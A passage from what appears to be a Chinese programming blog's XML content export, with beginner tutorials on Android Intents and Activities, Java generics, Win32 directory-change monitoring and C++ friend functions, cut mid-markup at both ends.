class="name">intent-filter</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">intent-filter</span> &gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"com.wker.top"</span>/&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.DEFAULT"</span>/&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>intent-filter多次设定应该是没啥事情，看来可以设置多个，然后部署到我们的安卓手机上，然后我们再次打开刚才的程序进行测试，你的程序将会看到入下的效果：<br><img src="img1.jpg" alt="打开方式设置"><br>这个就是打开方式的一个设置，也是很简单的，我们随便打开一个，就会跳到那个activity上，具体怎么传送数据，我们之后再讨论。</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Java 泛型</title>
    <url>/2020/01/21/Java-%E6%B3%9B%E5%9E%8B/</url>
    <content><![CDATA[<h1 id="Java泛型"><a href="#Java泛型" class="headerlink" title="Java泛型"></a>Java泛型</h1><p>官方解释：</p>
<ol>
<li>第一是泛化。可以用T代表任意类型Java语言中引入泛型是一个较大的功能增强不仅语言、类型系统和编译器有了较大的变化，以支持泛型，而且类库也进行了大翻修，所以许多重要的类，比如集合框架，都已经成为泛型化的了，这带来了很多好处。</li>
<li>第二是类型安全。泛型的一个主要目标就是提高ava程序的类型安全，使用泛型可以使编译器知道变量的类型限制，进而可以在更高程度上验证类型假设。如果不用泛型，则必须使用强制类型转换，而强制类型转换不安全，在运行期可能发生ClassCast Exception异常，如果使用泛型，则会在编译期就能发现该错误。</li>
<li>第三是消除强制类型转换。泛型可以消除源代码中的许多强制类型转换，这样可以使代码更加可读，并减少出错的机会。</li>
<li>第四是向后兼容。支持泛型的Java编译器（例如JDK1.5中的Javac）可以用来编译经过泛型扩充的Java程序（Generics Java程序），但是现有的没有使用泛型扩充的Java程序仍然可以用这些编译器来编译。</li>
</ol>
<p>这个东西感觉上有点类似于C++的模板和<code>static_cast</code>这种静态转换，从其他的地方借鉴来的一些知识（部分知识来自于博客：<a href="https://blog.csdn.net/s10461/article/details/53941091" target="_blank" rel="noopener" title="Java泛型">https://blog.csdn.net/s10461/article/details/53941091</a>）</p>
<h2 id="避免编译报错"><a href="#避免编译报错" class="headerlink" title="避免编译报错"></a>避免编译报错</h2><p>在我们使用容器的时候，由于ArrayList可以接受任何类型，所以导致我们有时会出现一些异常，下面是一个比较典型的例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.awt.List;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String agrs[])</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		ArrayList arrayList = <span class="keyword">new</span> ArrayList();</span><br><span class="line">		arrayList.add(<span class="string">"aaaa"</span>);</span><br><span class="line">		arrayList.add(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt; arrayList.size();i++)&#123;</span><br><span class="line">		    String item = (String)arrayList.get(i);</span><br><span class="line">		    System.out.println(<span class="string">"泛型测试"</span>+<span class="string">"item = "</span> + item);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行的时候会出现如下异常：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Exception in thread <span class="string">"main"</span> java.lang.ClassCastException: java.lang.Integer cannot be cast to java.lang.String</span><br><span class="line">	at Test.main(Test.java:<span class="number">12</span>)</span><br></pre></td></tr></table></figure>
<p>意思就是说Int不能到String，这个时候就是在编译的时候不会报错，但是运行的时候确实会出现错误，那么我们如何更改比较好呢？<br>我们可以这样：<br><img src="img1.jpg" alt="编译报错"><br>这个样子就比较好处理了，这个就类似于：<code>static_cast</code>，比较安全。</p>
<h2 id="泛型类"><a href="#泛型类" class="headerlink" title="泛型类"></a>泛型类</h2><p>这个听名字就和模板很像了，其实感觉起来就是那么一回事，简单地说就是参数化，我们给他一个String，里面的内容就是跟String有关的，那么具体怎么实现呢？</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String agrs[])</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		ceshi&lt;String&gt; sCeshi = <span class="keyword">new</span> ceshi&lt;String&gt;();</span><br><span class="line">		ceshi&lt;Integer&gt; iCeshi = <span class="keyword">new</span> ceshi&lt;Integer&gt;();</span><br><span class="line">		sCeshi.SetKey(<span class="string">"123"</span>);</span><br><span class="line">		iCeshi.SetKey(<span class="number">123</span>);</span><br><span class="line">		System.out.println(sCeshi.GetKey());</span><br><span class="line">		System.out.println(iCeshi.GetKey());</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ceshi</span>&lt;<span class="title">W</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> W key;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> W <span class="title">GetKey</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> key;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SetKey</span><span class="params">(W key)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.key = key;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="img2.jpg" alt="正确示范"><br>注意！不能对确切的泛型类型使用<code>instanceof</code>操作。如下面的操作是非法的，编译时会出错。<br><code>instanceof</code>就是查看是什么类，主要用在多态。</p>
<h2 id="泛型接口"><a href="#泛型接口" class="headerlink" title="泛型接口"></a>泛型接口</h2><p>这个和上面类似，也就是定义的时候需要注意加上&lt;&gt;就可以了。<br><code>implements Test&lt;String&gt;</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Test</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> T <span class="title">ceshi</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="泛型通配符"><a href="#泛型通配符" class="headerlink" title="泛型通配符"></a>泛型通配符</h2><p>这个东西主要是为了我们的方法做准备，有的时候需要传入一个泛型参数，但是什么填充类型呢？<br>我们可以用<code>?</code>进行填充，看下面示例代码就很容易明白了：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String agrs[])</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		ceshi&lt;String&gt; sCeshi = <span class="keyword">new</span> ceshi&lt;String&gt;();</span><br><span class="line">		ceshi&lt;Integer&gt; iCeshi = <span class="keyword">new</span> ceshi&lt;Integer&gt;();</span><br><span class="line">		sCeshi.SetKey(<span class="string">"123"</span>);</span><br><span class="line">		iCeshi.SetKey(<span class="number">123</span>);</span><br><span class="line">		Print(sCeshi);</span><br><span class="line">		Print(iCeshi);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Print</span><span class="params">(ceshi&lt;?&gt; T)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		System.out.println(T.GetKey());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ceshi</span>&lt;<span class="title">W</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> W key;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> W <span class="title">GetKey</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> key;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SetKey</span><span class="params">(W key)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.key = key;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先写这么多吧，下篇文章继续写！！！</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Intent Open Activity2</title>
    <url>/2020/01/21/Intent-Open-Activity2/</url>
    <content><![CDATA[<h1 id="Intent打开Activity的其他显示调用"><a href="#Intent打开Activity的其他显示调用" class="headerlink" title="Intent打开Activity的其他显示调用"></a>Intent打开Activity的其他显示调用</h1><p>一. 通过全类名</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Intent inten1 = <span class="keyword">new</span> Intent();</span><br><span class="line">inten1.setClassName(<span class="keyword">this</span>, <span class="string">"com.example.lx.activity"</span>);</span><br><span class="line">startActivity(inten1);</span><br></pre></td></tr></table></figure>
<p>二.通过包名和全类名</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Intent inten2 = <span class="keyword">new</span> Intent();</span><br><span class="line">inten2.setClassName(<span class="string">"com.example.test"</span>, <span class="string">"com.example.test.st"</span>);<span class="comment">//支持调用其他的应用程序</span></span><br><span class="line">startActivity(inten2);</span><br></pre></td></tr></table></figure>
<p>注意我的注释，可以打开其他的应用程序，意思就是远程打开另外APP的Activity，但在这我们需要注意，包名是包名，全类名要填写打开的Activity的全类名，但是有一点要注意，如果我们打开的是主界面那倒是无所谓，但是如果我们打开的不是主界面，那么我们就需要注意了，我们需要在配置我们的Activity属性的时候加上这么一句话：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">".st"</span> <span class="attr">android:exported</span>=<span class="string">"true"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到有一个exported的属性，这个就是是否允许远程调用，默认是false。<br>三.通过Component</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Intent inten1 = <span class="keyword">new</span> Intent();</span><br><span class="line">inten1.setClassName(<span class="keyword">this</span>, <span class="string">"com.example.lx.activity"</span>);</span><br><span class="line">inten1.setComponent(<span class="keyword">new</span> ComponentName(<span class="keyword">this</span>,activity<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">startActivity(inten1);</span><br></pre></td></tr></table></figure>
<p>new一个就可以了</p>
<h2 id="安卓Listener"><a href="#安卓Listener" class="headerlink" title="安卓Listener"></a>安卓Listener</h2><p>一点小补充，我们如果偏要设置监听时候要用this，习惯win32的话呢我们需要将我们的类接上类似于：<code>OnClickListener</code>这个样子的一个借口，然后完成：<code>public void onClick(View v)</code>这个函数，<code>v.getId()</code>可以获得事件源，在R文件中的定义对比，建议还是用switch进行判断。</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Dir Monitor</title>
    <url>/2020/01/21/Dir-Monitor/</url>
    <content><![CDATA[<h1 id="目录监视功能"><a href="#目录监视功能" class="headerlink" title="目录监视功能"></a>目录监视功能</h1><p>这个实现的效果有很多办法，比如说Hook，但是这个的话呢相对而言有点小麻烦，但是灵活性比较好，但当我们要求比较低，只是想单纯的监视的时候（对更改的内容和文件名之类不感兴趣的时候），我们可以考虑<code>FindFirstChangeNotification</code>这个相关的函数。</p>
<h2 id="FindFirstChangeNotification"><a href="#FindFirstChangeNotification" class="headerlink" title="FindFirstChangeNotification"></a><code>FindFirstChangeNotification</code></h2><p>这个函数是队目录监控的一个函数，具体微软怎么实现的不知道（感觉应该也跟钩子有关系），这个函数调用比较简单，共有下面三个参数：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">FindFirstChangeNotification</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpPathName,    <span class="comment">// pointer to name of directory to watch</span></span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL bWatchSubtree,    <span class="comment">// flag for monitoring directory or </span></span></span></span><br><span class="line"><span class="function"><span class="params">                         <span class="comment">// directory tree</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwNotifyFilter   <span class="comment">// filter conditions to watch for</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<ol>
<li>lpPathName：监视的目录文件夹</li>
<li>bWatchSubtree ：是否监视子目录</li>
<li>dwNotifyFilter：监视的类型</li>
</ol>
<ul>
<li>FILE_NOTIFY_CHANGE_FILE_NAME</li>
<li>FILE_NOTIFY_CHANGE_DIR_NAME</li>
<li>FILE_NOTIFY_CHANGE_ATTRIBUTES</li>
<li>FILE_NOTIFY_CHANGE_SIZE</li>
<li>FILE_NOTIFY_CHANGE_LAST_WRITE</li>
<li>FILE_NOTIFY_CHANGE_SECURITY<br>看名字就能看明白了。<br>返回值是一个句柄，这个句柄可以通过等待进行相应，这也就是下面我将要说到的一个函数。和这个相关的是：<code>FindNextChangeNotification</code>, <code>FindCloseChangeNotification</code>这个在最后提。<h2 id="WaitForMultipleObjects"><a href="#WaitForMultipleObjects" class="headerlink" title="WaitForMultipleObjects"></a><code>WaitForMultipleObjects</code></h2>这个函数有点类似于：<code>WaitForSingleObject</code>，但是这个我们是支持单个对象的，但对于多对象的我们就需要用到<code>WaitForMultipleObjects</code>，看下MSDN给出的定义：<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">WaitForMultipleObjects</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD nCount,             <span class="comment">// number of handles in the handle array</span></span></span></span><br><span class="line"><span class="function"><span class="params">	CONST HANDLE *lpHandles,  <span class="comment">// pointer to the object-handle array</span></span></span></span><br><span class="line"><span class="function"><span class="params">	BOOL fWaitAll,            <span class="comment">// wait flag</span></span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD dwMilliseconds      <span class="comment">// time-out interval in milliseconds);</span></span></span></span><br></pre></td></tr></table></figure></li>
</ul>
<ol>
<li>nCount：等待的个数</li>
<li>lpHandles：等待时间句柄的数组</li>
<li>fWaitAll：是否等待所有时间都相应</li>
<li>dwMilliseconds：等待的时间</li>
</ol>
<p>dwMilliseconds这个参数如果我们提供：INFINITE 这个的话呢将视为无线等待（一般就填写这个就比较好）。<br>返回值：<br>WAIT_OBJECT_0 to (WAIT_OBJECT_0 + nCount – 1)：If bWaitAll is TRUE, the return value indicates that the state of all specified objects is signaled.<br>If bWaitAll is FALSE, the return value minus WAIT_OBJECT_0 indicates the lpHandles array index of the object that satisfied the wait. If more than one object became signalled during the call, this is the array index of the signalled object with the smallest index value of all the signalled objects.</p>
<p>WAIT_ABANDONED_0 to (WAIT_ABANDONED_0 + nCount – 1)：If bWaitAll is TRUE, the return value indicates that the state of all specified objects is signaled and at least one of the objects is an abandoned mutex object.<br>If bWaitAll is FALSE, the return value minus WAIT_ABANDONED_0 indicates the lpHandles array index of an abandoned mutex object that satisfied the wait.</p>
<p>WAIT_TIMEOUT：The time-out interval elapsed and the conditions specified by the bWaitAll parameter are not satisfied. </p>
<p>是不是有点眼花缭乱，我翻译一下吧：</p>
<p>如果bWaitAll为真，则返回值表示所有指定对象的状态都有信号。如果bWaitAll为FALSE，则返回值减去WAIT_OBJECT_0表示满足等待的对象的lpHandles数组索引。如果在调用期间有多个对象被标记，这是标记对象的数组索引，索引值是所有标记对象的最小值。如果bWaitAll为真，则返回值表明所有指定对象的状态都有信号，并且至少有一个对象是废弃的互斥对象。如果bWaitAll为FALSE，则返回值减去wait_oned_0表示满足等待的废弃互斥对象的lpHandles数组索引。超时时间间隔和bWaitAll参数指定的条件不满足。</p>
<p>简单地说我们如果是无限等待返回给我们的值-WAIT_OBJECT_0就是我们提供的对象句柄的数组的下标值。</p>
<h2 id="测试代码："><a href="#测试代码：" class="headerlink" title="测试代码："></a>测试代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE m_charnge[<span class="number">3</span>];</span><br><span class="line">	m_charnge[<span class="number">0</span>]=FindFirstChangeNotification(<span class="string">"E:\\"</span>,TRUE,FILE_NOTIFY_CHANGE_FILE_NAME);</span><br><span class="line">	m_charnge[<span class="number">1</span>]=FindFirstChangeNotification(<span class="string">"E:\\"</span>,TRUE,FILE_NOTIFY_CHANGE_DIR_NAME);</span><br><span class="line">	m_charnge[<span class="number">2</span>]=FindFirstChangeNotification(<span class="string">"E:\\"</span>,TRUE,FILE_NOTIFY_CHANGE_LAST_WRITE);	</span><br><span class="line">	<span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		DWORD Rv = WaitForMultipleObjects(<span class="number">3</span>,m_charnge,FALSE,INFINITE);</span><br><span class="line">		<span class="keyword">switch</span>(Rv-WAIT_OBJECT_0)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">"文件名改變"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">"目錄改變"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">"內容改變"</span>&lt;&lt;<span class="built_in">endl</span>;			</span><br><span class="line">		&#125;</span><br><span class="line">		FindNextChangeNotification(m_charnge[Rv]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意的是在填写监视目录的时候别忘记转义，其他的都好说。</p>
]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>C++ friend fun</title>
    <url>/2020/01/21/C-friend-fun/</url>
    <content><![CDATA[<h1 id="友元函数"><a href="#友元函数" class="headerlink" title="友元函数"></a>友元函数</h1><p>这种函数当时学的时候忘了，在这里重新回忆一下，这种函数的作用和他的名字一样，就是方便我们的使用，就是说你没有必要将这个函数放在你的类中，只需要在生命的时候给他前面加上一个friend，然后就在外部声明就好了，还有就是友元类，这个和友元函数类似。<br>简单的看下友元函数的写法：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">private</span>:</span><br><span class="line">		<span class="keyword">int</span> a;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="function"><span class="keyword">int</span> <span class="title">Geta</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="keyword">return</span> a;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="function"><span class="keyword">friend</span> <span class="keyword">void</span> <span class="title">FGA</span><span class="params">(Test&amp; i)</span></span>;<span class="comment">//友元函数的定义</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FGA</span><span class="params">(Test&amp; i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	i.a = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Test *o = <span class="keyword">new</span> Test();</span><br><span class="line">	FGA(*o);</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;o-&gt;Geta()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>Intent Open Activity</title>
    <url>/2020/01/20/Intent-Open-Activity/</url>
    <content><![CDATA[<h1 id="通过Intent打开Activity"><a href="#通过Intent打开Activity" class="headerlink" title="通过Intent打开Activity"></a>通过Intent打开Activity</h1><h2 id="Intent"><a href="#Intent" class="headerlink" title="Intent"></a>Intent</h2><p>官方解释：<br>[^Intent]:Intent（意图）主要是解决Android应用的各项组件之间的通讯。<br>Intent负责对应用中一次操作的动作、动作涉及数据、附加数据进行描述，Android则根据此Intent的描述，负责找到对应的组件，将 Intent传递给被调用的组件，并完成组件的调用。<br>因此，Intent在这里起着一个媒体中介的作用，专门提供组件互相调用的相关信息，实现调用者与被调用者之间的解耦。</p>
<p>简单的说，这个东西通俗的将其实就是一个媒介，通过在他里面放东西，然后做一些事情（目前我的层面是这么理解）。</p>
<h2 id="Activity"><a href="#Activity" class="headerlink" title="Activity"></a>Activity</h2><p>这个东西就类似是一个界面，用于和用户进行界面交互。</p>
<h2 id="通过Intent打开一个Activity"><a href="#通过Intent打开一个Activity" class="headerlink" title="通过Intent打开一个Activity"></a>通过Intent打开一个Activity</h2><p>我们经常会有这样子的需求，就是说我们需要在这个页面通过一个按钮打开另外的一个页面，那么我们就可以这个样子进行操作。<br>首先我们用eclipse创建一个安卓项目，自带一个Activity，然后我们编辑：res/layout下生成的xml文件，我们添加一个button，布局什么的这些测试的过程中不是很重要。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">	<span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/btn_OpenActivity"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_alignLeft</span>=<span class="string">"@+id/textView1"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_below</span>=<span class="string">"@+id/textView1"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"@string/Open"</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- PS：</span></span><br><span class="line"><span class="comment">第一句代码，是用来指定我们的button的ID为：btn_OpenActivity</span></span><br><span class="line"><span class="comment">第二三句代码：用来指定我们的button宽与高（wrap_content表示与文字同高宽）</span></span><br><span class="line"><span class="comment">四五句：layout_alignLeft：这个表示与给定ID同左边，五类似四</span></span><br><span class="line"><span class="comment">@string/Open：这个主要是在我们的res/values/strings.xml这个文件中有我们给定的常量值。</span></span><br><span class="line"><span class="comment"> --&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们编辑完Activity.xml之后我们再添加一个布局，这个就是我们通过Intent打开的一个界面，编辑的话呢，也不是很重要，参考上面就好。</p>
<p><strong>然后我们在 AndroidManifest.xml 文件中的加上Activity一个节点：<code>&lt;activity android:name=&quot;.activity&quot;&gt;&lt;/activity&gt;</code>，这个就有点类似于声明一个Activity。</strong></p>
<p>编辑完之后我们新建一个类，这个类是我们的第二个界面，这个类要继承于Activity这个类，表明他是一个窗口，我们重载<code>onCreate</code>这个函数用来添加我们的上下文对象（注意这里与Win32有点类似，Win32称之为DC，但是我Java称之为Layout），具体代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.lx;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">activity</span> <span class="keyword">extends</span> <span class="title">Activity</span></span>&#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">		setContentView(R.layout.activity_01);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">比较好理解，其实setContentView这个函数就是一个就是关联一个布局，这个布局的ID在我们gen/R.java这个文件中进行定义，final static定义的一个常量。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>我们编辑完我们的Activity打开页面之后，我们来编辑我们的初始界面，这个界面我们使用下面的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.lx;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.Menu;</span><br><span class="line"><span class="keyword">import</span> android.view.MenuItem;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> Button btn_test;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">		setContentView(R.layout.activity_main);</span><br><span class="line">		btn_test = (Button) findViewById(R.id.btn_OpenActivity);</span><br><span class="line">		btn_test.setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">			</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">				Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">				intent.setClass(MainActivity.<span class="keyword">this</span>, activity<span class="class">.<span class="keyword">class</span>)</span>;<span class="comment">//packageContext上下文</span></span><br><span class="line">				startActivity(intent);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onCreateOptionsMenu</span><span class="params">(Menu menu)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// Inflate the menu; this adds items to the action bar if it is present.</span></span><br><span class="line">		getMenuInflater().inflate(R.menu.main, menu);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onOptionsItemSelected</span><span class="params">(MenuItem item)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// Handle action bar item clicks here. The action bar will</span></span><br><span class="line">		<span class="comment">// automatically handle clicks on the Home/Up button, so long</span></span><br><span class="line">		<span class="comment">// as you specify a parent activity in AndroidManifest.xml.</span></span><br><span class="line">		<span class="keyword">int</span> id = item.getItemId();</span><br><span class="line">		<span class="keyword">if</span> (id == R.id.action_settings) 